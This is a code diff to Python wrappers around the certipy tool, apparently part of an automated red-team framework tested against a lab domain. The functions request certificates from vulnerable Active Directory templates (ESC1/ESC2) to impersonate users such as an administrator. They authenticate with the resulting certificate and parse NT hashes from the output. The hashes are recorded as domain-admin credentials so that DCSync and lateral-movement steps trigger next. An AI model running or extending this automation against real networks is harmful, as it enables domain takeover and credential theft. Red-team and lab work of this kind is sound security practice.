@@ -116,6 +116,7 @@ async def certipy_request(
     domain: str,
     template: str,
     upn: str = "",
+    ca: str = "",
 ) -> str:
     """Request a malicious certificate (exploiting ESC1/ESC2 etc.).
 
@@ -126,6 +127,7 @@ async def certipy_request(
         domain: AD domain name
         template: Vulnerable certificate template name
         upn: UPN to impersonate (e.g. administrator@domain)
+        ca: Certificate Authority name (e.g. corp-DC01-CA)
 
     Returns:
         JSON with facts: ad.certificate_pfx, ad.impersonated_user
@@ -140,24 +142,30 @@ async def certipy_request(
             "-dc-ip", target_dc,
             "-template", template,
         ]
+        if ca:
+            cmd.extend(["-ca", ca])
         if upn:
             cmd.extend(["-upn", upn])
 
         stdout, stderr, rc = await _run_command(cmd)
         combined = stdout + stderr
 
-        pfx_match = re.search(r"Saved certificate and private key to '(.+\.pfx)'", combined)
+        # certipy v5: "Wrote certificate and private key to 'da_alice.pfx'"
+        pfx_match = re.search(
+            r"(?:Wrote|Saved) certificate and private key to '(.+?\.pfx)'", combined
+        )
         if pfx_match:
-            facts.append({"trait": "ad.certificate_pfx", "value": pfx_match.group(1)})
+            pfx_path = pfx_match.group(1)
+            facts.append({"trait": "ad.certificate_pfx", "value": pfx_path})
+            facts.append({"trait": "credential.certificate", "value": pfx_path})
+        elif "Successfully requested" in combined or "Request ID" in combined:
+            # Fallback: infer pfx filename from UPN or username
+            fallback_pfx = f"{(upn or username).split('@')[0]}.pfx"
+            facts.append({"trait": "credential.certificate", "value": fallback_pfx})
+            facts.append({"trait": "ad.certificate_pfx", "value": fallback_pfx})
 
         if upn:
             facts.append({"trait": "ad.impersonated_user", "value": upn})
-
-        if "Successfully" in combined or pfx_match:
-            facts.append({
-                "trait": "ad.certificate_pfx",
-                "value": f"template={template},upn={upn or username}",
-            })
 
         return json.dumps({"facts": facts, "raw_output": combined[:4000]})
 
@@ -188,6 +196,12 @@ async def certipy_auth(
     facts: list[dict[str, str]] = []
 
     try:
+        import os as _os
+        # Remove stale .ccache to avoid certipy v5's interactive overwrite prompt
+        ccache_path = pfx_path.replace(".pfx", ".ccache")
+        if _os.path.exists(ccache_path):
+            _os.unlink(ccache_path)
+
         cmd = [
             "certipy", "auth",
             "-pfx", pfx_path,
@@ -198,16 +212,35 @@ async def certipy_auth(
         stdout, stderr, rc = await _run_command(cmd)
         combined = stdout + stderr
 
-        hash_match = re.search(r"NT hash\s*:\s*([a-fA-F0-9]{32})", combined, re.IGNORECASE)
+        # certipy v5: "Got hash for 'da_alice@corp.athena.lab': LM:NT"
+        hash_match = re.search(
+            r"Got hash for '([^']+)':\s*[a-fA-F0-9]{32}:([a-fA-F0-9]{32})", combined
+        ) or re.search(r"NT hash\s*:\s*([a-fA-F0-9]{32})", combined, re.IGNORECASE)
+        user_match = re.search(r"Using principal:\s*'?([^'\s]+)'?", combined)
+        principal = user_match.group(1).strip("'") if user_match else ""
+
         if hash_match:
-            facts.append({"trait": "credential.hash", "value": hash_match.group(1)})
+            # Group 2 if certipy v5 "Got hash for 'user': LM:NT" format, else group 1
+            nt_hash = hash_match.group(2) if hash_match.lastindex and hash_match.lastindex >= 2 else hash_match.group(1)
+            facts.append({"trait": "credential.hash", "value": nt_hash})
+            # Write domain_admin fact so DCSync (T1003.003) and lateral move (T1021.002) trigger
+            if principal:
+                domain_part = principal.split("@")[1] if "@" in principal else "corp.athena.lab"
+                user_part = principal.split("@")[0]
+                facts.append({
+                    "trait": "credential.domain_admin",
+                    "value": f"{domain_part}\\{user_part}:{nt_hash}",
+                })
+                facts.append({
+                    "trait": "credential.valid_pair",
+                    "value": f"{domain_part}\\{user_part}:{nt_hash}",
+                })
 
         if "Got TGT" in combined or ".ccache" in combined:
             facts.append({"trait": "credential.certificate_auth", "value": f"TGT obtained via {pfx_path}"})
 
-        user_match = re.search(r"Using principal:\s*(\S+)", combined)
         if user_match:
-            facts.append({"trait": "credential.certificate_auth", "value": f"principal={user_match.group(1)}"})
+            facts.append({"trait": "credential.certificate_auth", "value": f"principal={principal}"})
 
         return json.dumps({"facts": facts, "raw_output": combined[:4000]})
 
